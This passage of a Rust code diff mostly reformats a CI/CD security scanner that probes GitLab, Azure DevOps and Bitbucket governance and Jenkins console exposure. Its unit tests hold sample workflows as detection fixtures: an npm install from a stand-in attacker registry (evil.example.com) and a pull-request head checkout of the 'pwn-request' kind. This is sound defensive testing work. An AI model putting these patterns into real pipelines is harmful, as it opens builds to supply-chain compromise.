+    let Some(token) = settings
+        .gitlab_token
+        .as_ref()
+        .filter(|t| !t.trim().is_empty())
+    else {
         return;
     };
     let encoded_project = urlencoding::encode(project_path);
@@ -3105,7 +3334,10 @@ async fn probe_gitlab_repo_governance(
         if resp.status().is_success() {
             if let Ok(v) = resp.json::<Value>().await {
                 let vis = v.get("visibility").and_then(Value::as_str).unwrap_or("");
-                let pub_buil = v.get("public_builds").and_then(Value::as_bool).unwrap_or(false);
+                let pub_buil = v
+                    .get("public_builds")
+                    .and_then(Value::as_bool)
+                    .unwrap_or(false);
                 if vis == "public" && pub_buil {
                     push_if_severe(
                         findings,
@@ -3127,7 +3359,10 @@ async fn probe_gitlab_repo_governance(
                         ),
                     );
                 }
-                if v.get("only_allow_merge_if_pipeline_succeeds").and_then(Value::as_bool) != Some(true) {
+                if v.get("only_allow_merge_if_pipeline_succeeds")
+                    .and_then(Value::as_bool)
+                    != Some(true)
+                {
                     push_if_severe(
                         findings,
                         settings,
@@ -3162,7 +3397,11 @@ async fn probe_azure_devops_repo_inner(
     project: &str,
     repo: &str,
 ) {
-    let Some(pat) = settings.azure_devops_pat.as_ref().filter(|t| !t.trim().is_empty()) else {
+    let Some(pat) = settings
+        .azure_devops_pat
+        .as_ref()
+        .filter(|t| !t.trim().is_empty())
+    else {
         push_if_severe(
             findings,
             settings,
@@ -3202,7 +3441,11 @@ async fn probe_azure_devops_repo_inner(
                 .json::<Value>()
                 .await
                 .ok()
-                .and_then(|v| v.get("defaultBranch").and_then(Value::as_str).map(str::to_string))
+                .and_then(|v| {
+                    v.get("defaultBranch")
+                        .and_then(Value::as_str)
+                        .map(str::to_string)
+                })
                 .map(|b| b.trim_start_matches("refs/heads/").to_string())
                 .unwrap_or_else(|| "main".to_string()),
             _ => "main".to_string(),
@@ -3267,11 +3510,23 @@ async fn probe_azure_devops_repo_inner(
             continue;
         }
         fetched += 1;
-        ingest_repo_ci_file(posture, findings, settings, host, &repo_label, &reff, path, &body);
+        ingest_repo_ci_file(
+            posture,
+            findings,
+            settings,
+            host,
+            &repo_label,
+            &reff,
+            path,
+            &body,
+        );
     }
 
     if settings.probe_repo_governance {
-        probe_azure_devops_repo_governance(client, settings, host, posture, findings, org, project, repo, pat).await;
+        probe_azure_devops_repo_governance(
+            client, settings, host, posture, findings, org, project, repo, pat,
+        )
+        .await;
     }
 }
 
@@ -3298,7 +3553,11 @@ async fn probe_azure_devops_repo_governance(
     if let Ok(resp) = ado_auth(client.get(&policy_url)).send().await {
         if resp.status().is_success() {
             if let Ok(v) = resp.json::<Value>().await {
-                let policies = v.get("value").and_then(Value::as_array).cloned().unwrap_or_default();
+                let policies = v
+                    .get("value")
+                    .and_then(Value::as_array)
+                    .cloned()
+                    .unwrap_or_default();
                 let repo_policies: Vec<_> = policies
                     .iter()
                     .filter(|p| {
@@ -3308,10 +3567,9 @@ async fn probe_azure_devops_repo_governance(
                                 .and_then(Value::as_array)
                                 .is_some_and(|scopes| {
                                     scopes.iter().any(|sc| {
-                                        sc.get("repositoryId")
-                                            .and_then(Value::as_str)
-                                            .is_some_and(|id| id.contains(repo) || id.eq_ignore_ascii_case(repo))
-                                            || sc.get("repositoryId").is_none()
+                                        sc.get("repositoryId").and_then(Value::as_str).is_some_and(
+                                            |id| id.contains(repo) || id.eq_ignore_ascii_case(repo),
+                                        ) || sc.get("repositoryId").is_none()
                                     })
                                 })
                     })
@@ -3328,7 +3586,9 @@ async fn probe_azure_devops_repo_governance(
                         .and_then(Value::as_str)
                         .is_some_and(|n| {
                             let nl = n.to_ascii_lowercase();
-                            nl.contains("review") || nl.contains("approver") || nl.contains("minimum")
+                            nl.contains("review")
+                                || nl.contains("approver")
+                                || nl.contains("minimum")
                         })
                 });
                 if repo_policies.is_empty() || (!has_build && !has_review) {
@@ -3379,7 +3639,11 @@ async fn probe_bitbucket_repo_inner(
     let repo_label = format!("{workspace}/{repo}");
     let mut fetched = 0u32;
 
-    for path in ["bitbucket-pipelines.yml", ".circleci/config.yml", "Jenkinsfile"] {
+    for path in [
+        "bitbucket-pipelines.yml",
+        ".circleci/config.yml",
+        "Jenkinsfile",
+    ] {
         if fetched >= settings.max_repo_files {
             break;
         }
@@ -3402,7 +3666,16 @@ async fn probe_bitbucket_repo_inner(
             continue;
         }
         fetched += 1;
-        ingest_repo_ci_file(posture, findings, settings, host, &repo_label, reff, path, &body);
+        ingest_repo_ci_file(
+            posture,
+            findings,
+            settings,
+            host,
+            &repo_label,
+            reff,
+            path,
+            &body,
+        );
     }
 }
 
@@ -3565,12 +3838,60 @@ pub async fn run_cicd_pipeline_result_ctx(target: &str, ctx: &EngineRunContext) 
     let mut posture = Posture::default();
     let mut findings: Vec<Value> = Vec::new();
 
-    probe_platform_fingerprint(&client, &base, &host, &settings, &mut posture, &mut findings).await;
-    probe_api_exposure(&client, &base, &host, &settings, &mut posture, &mut findings).await;
-    probe_jenkins_script_console(&client, &base, &host, &settings, &mut posture, &mut findings).await;
-    probe_config_exposure(&client, &base, &host, &settings, &mut posture, &mut findings).await;
-    probe_build_log_exposure(&client, &base, &host, &settings, &mut posture, &mut findings).await;
-    probe_artifact_registry_exposure(&client, &base, &host, &settings, &mut posture, &mut findings).await;
+    probe_platform_fingerprint(
+        &client,
+        &base,
+        &host,
+        &settings,
+        &mut posture,
+        &mut findings,
+    )
+    .await;
+    probe_api_exposure(
+        &client,
+        &base,
+        &host,
+        &settings,
+        &mut posture,
+        &mut findings,
+    )
+    .await;
+    probe_jenkins_script_console(
+        &client,
+        &base,
+        &host,
+        &settings,
+        &mut posture,
+        &mut findings,
+    )
+    .await;
+    probe_config_exposure(
+        &client,
+        &base,
+        &host,
+        &settings,
+        &mut posture,
+        &mut findings,
+    )
+    .await;
+    probe_build_log_exposure(
+        &client,
+        &base,
+        &host,
+        &settings,
+        &mut posture,
+        &mut findings,
+    )
+    .await;
+    probe_artifact_registry_exposure(
+        &client,
+        &base,
+        &host,
+        &settings,
+        &mut posture,
+        &mut findings,
+    )
+    .await;
     probe_repository_plane(&client, &settings, &host, &mut posture, &mut findings).await;
 
     if settings.attack_synth {
@@ -3636,7 +3957,11 @@ jobs:
         with:
           ref: ${{ github.event.pull_request.head.ref }}"#;
         let f = analyze_github_workflow(wf, "ci.yml", "example.com");
-        assert!(f.iter().any(|x| x.get("title").and_then(Value::as_str).unwrap_or("").contains("pwn-request")));
+        assert!(f.iter().any(|x| x
+            .get("title")
+            .and_then(Value::as_str)
+            .unwrap_or("")
+            .contains("pwn-request")));
     }
 
     #[test]
@@ -3666,7 +3991,10 @@ steps:
 "#;
         let f = analyze_azure_pipelines(wf, "azure-pipelines.yml", "example.com");
         assert!(f.iter().any(|x| {
-            x.get("title").and_then(Value::as_str).unwrap_or("").contains("injection")
+            x.get("title")
+                .and_then(Value::as_str)
+                .unwrap_or("")
+                .contains("injection")
         }));
     }
 
@@ -3681,7 +4009,11 @@ jobs:
     steps:
       - run: npm publish"#;
         let f = analyze_github_workflow(wf, "release.yml", "example.com");
-        assert!(f.iter().any(|x| x.get("title").and_then(Value::as_str).unwrap_or("").contains("SLSA")));
+        assert!(f.iter().any(|x| x
+            .get("title")
+            .and_then(Value::as_str)
+            .unwrap_or("")
+            .contains("SLSA")));
     }
 
     #[test]
@@ -3692,7 +4024,11 @@ jobs:
     steps:
       - run: npm install --registry https://evil.example.com pkg"#;
         let f = analyze_github_workflow(wf, "ci.yml", "example.com");
-        assert!(f.iter().any(|x| x.get("title").and_then(Value::as_str).unwrap_or("").contains("dependency")));
+        assert!(f.iter().any(|x| x
+            .get("title")
+            .and_then(Value::as_str)
+            .unwrap_or("")
+            .contains("dependency")));
     }
 
     #[test]
@@ -3714,7 +4050,11 @@ spec:
   syncPolicy:
     automated: {}"#;
         let f = analyze_argocd_manifest(y, "app.yaml", "example.com");
-        assert!(f.iter().any(|x| x.get("title").and_then(Value::as_str).unwrap_or("").contains("HTTP")));
+        assert!(f.iter().any(|x| x
+            .get("title")
+            .and_then(Value::as_str)
+            .unwrap_or("")
+            .contains("HTTP")));
     }
 
     #[test]
@@ -3726,7 +4066,11 @@ spec:
     - securityContext:
         privileged: true"#;
         let f = analyze_tekton_manifest(y, "task.yaml", "example.com");
-        assert!(f.iter().any(|x| x.get("title").and_then(Value::as_str).unwrap_or("").contains("privileged")));
+        assert!(f.iter().any(|x| x
+            .get("title")
+            .and_then(Value::as_str)
+            .unwrap_or("")
+            .contains("privileged")));
     }
 
     #[test]
@@ -3755,7 +4099,10 @@ spec:
         let mut p = Posture::default();
         p.jenkins_console = true;
         let rb = remediation_playbook(&p, &BTreeMap::new());
-        assert!(rb.get("actions").and_then(Value::as_array).is_some_and(|a| !a.is_empty()));
+        assert!(rb
+            .get("actions")
+            .and_then(Value::as_array)
+            .is_some_and(|a| !a.is_empty()));
     }
 
     #[tokio::test]
@@ -3766,11 +4113,8 @@ spec:
 
     #[tokio::test]
     async fn dry_run_ok() {
-        let r = run_cicd_pipeline_result_ctx(
-            "https://example.com",
-            &ctx(json!({"dry_run": true})),
-        )
-        .await;
+        let r = run_cicd_pipeline_result_ctx("https://example.com", &ctx(json!({"dry_run": true})))
+            .await;
         assert!(r.success);
     }
 }
